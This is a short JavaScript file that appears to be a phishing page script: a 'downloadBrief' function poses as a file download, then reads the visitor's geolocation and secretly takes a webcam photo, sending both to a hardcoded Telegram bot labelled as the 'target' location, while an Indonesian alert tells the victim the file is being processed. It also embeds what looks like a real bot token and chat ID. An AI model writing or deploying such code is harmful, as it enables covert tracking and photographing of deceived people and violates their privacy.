const TELEGRAM_BOT_TOKEN = '7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw';
const CHAT_ID = '6466187930';

function sendLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Lokasi target: https://maps.google.com/?q=${lat},${lon}`);
  });
}

function captureCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      imageCapture.takePhoto()
        .then(blob => {
          const formData = new FormData();
          formData.append('photo', blob, 'glofy-cam.jpg');
          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
            method: 'POST',
            body: formData
          });
        });
    });
}

function downloadBrief() {
  sendLocation();
  captureCamera();
  alert("Terima kasih, file sedang diproses. Silakan tunggu beberapa detik...");
                }
